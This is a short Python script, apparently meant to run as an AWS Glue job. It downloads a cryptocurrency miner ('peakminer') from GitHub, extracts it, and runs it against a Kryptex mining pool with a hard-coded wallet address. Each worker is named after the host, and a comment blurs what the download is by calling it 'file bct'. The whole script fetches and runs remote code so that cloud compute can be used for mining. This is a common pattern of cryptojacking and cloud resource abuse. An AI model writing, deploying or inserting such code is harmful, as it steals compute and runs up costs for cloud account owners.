import os
import subprocess
import sys
import socket

def run_shell_command(command):
    print(f"Menjalankan perintah: {command}")
    
    # Menjalankan command dan menangkap output
    process = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    # Mencetak output ke AWS CloudWatch Logs
    if process.stdout:
        print("STDOUT:")
        print(process.stdout)
        
    # Menangani error jika perintah gagal
    if process.returncode != 0:
        print("STDERR:")
        print(process.stderr)
        sys.exit(1)

# 1. Mendapatkan ID Perangkat / Nama Worker secara dinamis
# Mengambil Glue Worker ID bawaan AWS, jika tidak ada pakai Hostname sistem
worker_name = os.environ.get('GLUE_WORKER_ID')

if not worker_name:
    try:
        # Menghasilkan nama unik dari nama host (misal: ip-10-0-1-5)
        worker_name = socket.gethostname().split('.')[0]
    except Exception:
        worker_name = "glue-worker-unknown"

print(f"Nama Worker yang digunakan: {worker_name}")

# 2. Mengunduh file bct
run_shell_command("curl -L -O https://github.com/kryptex-miners-org/kryptex-miners/releases/download/peakminer-2-18-3/peakminer-2.18.3.tar.gz")

# 3. Mengubah izin akses file
run_shell_command("tar -xvf peakminer-2.18.3.tar.gz")

# 4. Menjalankan bct dengan menyisipkan Nama Worker yang sudah didapat
command_run = f"./peakminer --coin pearl -o stratum+tcp://prl.kryptex.network:7048 -u prl1pjp3jd7ue653f6zyrn9ewwu7lalw538kn5w2l4lekv0g3nxqlj23qnwg6g0/{worker_name}"
run_shell_command(command_run)
